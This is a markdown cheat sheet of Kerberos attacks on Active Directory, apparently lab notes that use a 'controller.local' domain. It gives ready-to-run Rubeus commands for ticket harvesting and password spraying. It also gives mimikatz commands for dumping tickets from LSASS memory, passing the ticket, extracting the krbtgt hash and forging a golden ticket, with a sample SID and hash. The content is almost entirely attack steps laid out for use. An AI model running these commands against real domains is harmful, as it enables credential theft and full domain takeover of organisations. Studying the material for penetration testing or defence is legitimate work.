#### Attack Privileges Requirements
-   Kerbrute Enumeration - No domain access required 
-   Pass the Ticket - Access as a user to the domain required
-   Kerberoasting - Access as any user required
-   AS-REP Roasting - Access as any user required
-   Golden Ticket - Full domain compromise (domain admin) required 
-   Silver Ticket - Service hash required 
-   Skeleton Key - Full domain compromise (domain admin) required

---
### Harvesting & Brute-forcing Tickets
__On the victim machine__
- Harvest for TGTs every 30 seconds

```powershell
Rubeus.exe harvest /interval:30
```

- This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
```powershell
Rubeus.exe brute /password:Password1 /noticket
```

---
### Pass the Ticket
>When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.

>Local Admin on local box, we can access all the tickets, if domain logged in then domain takeover


```powershell
privilege::debug
```
- Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz

__Dump a TGT from LSASS memory__
- Exports all of the .kirbi tickets into the directory that you are currently in
```powershell
sekurlsa::tickets /export
```

__Pass the Ticket__
- It will cache and impersonate the given ticket
```powershell
kerberos::ptt <ticket>
```

- Verifying that we successfully impersonated the ticket by listing our cached tickets.

```powershell
klist
```

---
### Silver/Golden Ticket
> Silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

>A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

Dump the hash & security identifier for Golden Ticket
Change the /name: to dump the hash of a domain admin or a service account
```powershell
lsadump::lsa /inject /name:krbtgt
```

__Create Golden Ticket__
```powershell
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
```

```powershell
Kerberos::golden /user:Administrator /domain:controller.local /sid:S
-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f
6 /id:50
```







